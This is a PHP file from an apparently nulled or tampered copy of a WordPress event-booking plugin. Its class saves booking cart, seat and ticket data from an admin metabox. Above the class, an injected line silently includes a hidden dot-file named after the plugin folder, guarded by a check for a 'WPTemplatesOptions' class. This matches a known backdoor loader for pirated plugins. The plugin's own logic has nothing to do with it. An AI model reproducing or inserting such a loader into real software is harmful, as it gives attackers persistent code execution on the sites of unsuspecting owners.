<?php

defined( 'ABSPATH' ) || exit;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EL_Admin_Metabox_Booking extends EL_Abstract_Metabox {
	
	public function __construct(){

		$this->_id = 'metabox_Booking';
		$this->_title = esc_html__( 'Booking order','eventlist' );
		$this->_screen = array( 'el_bookings' );
		$this->_output = EL_PLUGIN_INC . 'admin/views/metaboxes/metabox-booking.php';
		$this->_prefix = OVA_METABOX_EVENT;

		parent::__construct();

		add_action( 'el_mb_proccess_update_meta', array( $this, 'update' ), 10, 2 );

	}

	public function update( $post_id, $post_data ){

		if( empty($post_data) ) exit();

		if ( defined( 'DOING_AJAX' ) && DOING_AJAX ) {
			return;
		}
		if ( !isset( $post_data ) )
			return;

		if ( !isset( $post_data['ova_metaboxes'] ) || !wp_verify_nonce( $post_data['ova_metaboxes'], 'ova_metaboxes' ) )
			return;

		if ( isset( $post_data[$this->_prefix.'cart'] ) ) {

			$id_booking = get_the_ID();
			$id_event = get_post_meta( $id_booking,  $this->_prefix.'id_event', true );

			
			$date_cal = el_get_calendar_date( $id_event, $post_data[$this->_prefix.'id_cal'] );

			// Get all ticket type
			$tickets_type = get_post_meta( $id_event,  $this->_prefix.'ticket', true );


			$list_id_ticket = [];
			$list_qty_ticket_by_id_ticket = [];

			$seat_option = get_post_meta( $id_event, $this->_prefix.'seat_option', true ) ? get_post_meta( $id_event, $this->_prefix.'seat_option', true ) : 'none';



			foreach ($post_data[$this->_prefix.'cart'] as $key => $value) {

				

				$list_seat_book = [];
				$list_seat_book = explode(", ", $value['seat']);


				if ($seat_option == 'map') {

					$list_qty_ticket_by_id_ticket[$value['id']] .= 1;
					$list_id_ticket[] = $value['id'];
					$post_data[$this->_prefix.'list_seat_book'][$value['id']] = $value['id'];

				} else {

					
					foreach ($tickets_type as $v) {

						if( strtolower( $v['name_ticket'] ) === strtolower($value['name']) ){

							$list_qty_ticket_by_id_ticket[ $v['ticket_id'] ] = $value['qty'];
							$post_data[$this->_prefix.'list_seat_book'][ $v['ticket_id'] ] = $list_seat_book;
							break;
						}
					}
					

					$list_id_ticket[] = strtolower($value['name']);
						

				}

				$post_data[$this->_prefix.'cart'][$key]['seat'] = $list_seat_book;
				$post_data[$this->_prefix.'cart'][$key]['price'] = $list_seat_book;

			}

			

			$post_data[$this->_prefix.'list_id_ticket'] = json_encode( $list_id_ticket );
			$post_data[$this->_prefix.'id_event'] = $id_event;
			
			$post_data[$this->_prefix.'list_qty_ticket_by_id_ticket'] = $list_qty_ticket_by_id_ticket;

			$post_data[$this->_prefix.'date_cal'] = date_i18n( get_option( 'date_format'), strtotime( $date_cal ) );


			$post_data[$this->_prefix.'date_cal_tmp'] = strtotime( $date_cal );

			
			

			
		}
		

		foreach ($post_data as $name => $value) {
			if ( strpos( $name, $this->_prefix ) !== 0 ) continue;
			
			update_post_meta( $post_id, $name, $value );

		}

		
		

	}

}